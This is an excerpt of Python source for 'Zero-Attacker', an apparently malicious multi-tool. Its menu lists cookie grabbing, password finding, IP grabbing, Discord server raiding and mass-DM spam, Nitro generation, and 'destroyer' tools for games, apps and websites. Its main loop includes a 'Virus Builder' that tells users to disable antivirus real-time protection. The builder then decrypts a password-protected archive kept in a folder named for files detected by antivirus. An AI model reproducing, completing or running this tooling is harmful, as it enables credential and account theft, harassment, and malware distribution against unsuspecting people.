# Copyright (c) ZeroAttacker by legit
...
option_01 = "Member Botter"
option_02 = "Boost Bot"
option_03 = "Nitro Gen"
option_04 = "Alt Maker"
option_05 = "Server Raider"
option_06 = "Mass Dm"
option_07 = "Soon"
option_08 = "Soon"
option_09 = "Soon"

option_10 = "CookieGrab"
option_11 = "Joiner"
option_12 = "13+"
option_13 = "VcBypass"
option_14 = "Username Tracker"
option_15 = "Password Finder"
option_16 = "Robux"
option_17 = "Ipgrab"
option_18 = "Soon"
option_19 = "Soon"

option_20 = "Steal A Brainrot"
option_21 = "Plants VS Brainrots"
option_22 = "99 Nights In Forest"
option_23 = "Grow A Garden"
option_24 = "Murder Mystery 2"
option_25 = "Adopt Me"
option_26 = "Soon"
option_27 = "Soon"
option_28 = "Soon"
...
option_31 = "Game Destroyer"
option_32 = "App Destroyer"
option_33 = "Website Destroyer"
option_34 = "Web Proxy"
option_35 = "Soon"
option_36 = "Soon"
option_37 = "Soon"
...
menu1 = f""" ┌─ {option_info_txt}                                                                                               {option_next_txt} ─┐
 ├─ {option_site_txt} ┌─────────────────┐                        ┌───────┐                           ┌───────────┐            │
 └─┬─────────┤ DiscordBots ├─────────┬──────────────┤RobloxBots ├──────────────┬────────────┤ AdminPanel ├────────────┴─
   │         └─────────────────┘         │              └───────┘              │            └───────────┘
...
─┴─┬──────────┤ Youtube Bot ├──────────┬──────────────┤ SUPER ├───────────────┬──────────────┤ Roblox ├──────────────┴─
   │          └───────────────┘          │              └──────┘               │              └────────┘
   └─ {option_30_txt                    }├─ {option_31_txt                    }├─ {option_40_txt}
           ├─ Subs                    ├─ {option_32_txt                    }├─ {option_41_txt}
           ├─ Likes                    ├─ {option_33_txt                    }├─ {option_42_txt}
           └─ Comments                    └─ {option_34_txt                    }└─ {option_43_txt}                                    
...
while True:
   try:
      ...
      choice = input(MainColor(f""" ┌──({white}{username_pc})─{red}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))
      ...
      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
         ...
         if os_name == "Linux":
            ...
            messagebox.showinfo(f"Zero-Attacker {version_tool} - Virus Builder", "The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
         ...
         messagebox.showinfo(f"Zero-Attacker {version_tool} - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
         try:
            zip_file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "Password(Zero-Attacker).zip")
            ...
            if not os.path.exists(file_path):
               if os.path.exists(zip_file_path):
                  print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\Password(Zero-Attacker).zip")
                  with pyzipper.AESZipFile(zip_file_path) as zf:
                     zf.pwd = b'Zero-Attacker'
